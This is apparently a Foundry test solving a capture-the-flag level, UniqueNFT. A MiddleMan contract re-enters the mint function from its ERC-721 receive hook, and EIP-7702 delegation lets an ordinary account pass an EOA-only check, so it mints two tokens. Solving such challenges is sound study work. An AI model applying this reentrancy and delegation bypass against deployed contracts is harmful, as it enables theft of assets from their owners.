// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "src/openzeppelin-ethernaut/UniqueNFT.sol";
import "node_modules/@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

contract MiddleMan is IERC721Receiver {
    UniqueNFT uniqueNFT;
    bool isCalled;

    function onERC721Received(
        address operator,
        address from,
        uint256 tokenId,
        bytes calldata data
    ) external returns (bytes4) {
        if (!isCalled) {
            isCalled = true;
            uniqueNFT.mintNFTEOA();
        }
        return IERC721Receiver.onERC721Received.selector;
    }

    function attack(address prey) public {
        uniqueNFT = UniqueNFT(prey);
        uniqueNFT.mintNFTEOA();
    }
}

// checkOnERC721Received() calling msg.sender for onERC721Received() is the reentrancy gate
// use EIP-7702 to pass the require() in mintNFTEOA() while being a contract for the previous step
contract UniqueNFTTest is Test {
    UniqueNFT instance;

    function setUp() public {
        instance = new UniqueNFT();
    }

    function test() public {
        (address alice, uint256 alicePk) = makeAddrAndKey("alice");
        MiddleMan middleMan = new MiddleMan();

        Vm.SignedDelegation memory signedDelegation = vm.signDelegation(
            address(middleMan),
            alicePk
        );

        vm.startPrank(alice, alice);
        vm.attachDelegation(signedDelegation);

        MiddleMan(alice).attack(address(instance));
        assertEq(instance.balanceOf(alice), 2);
    }
}
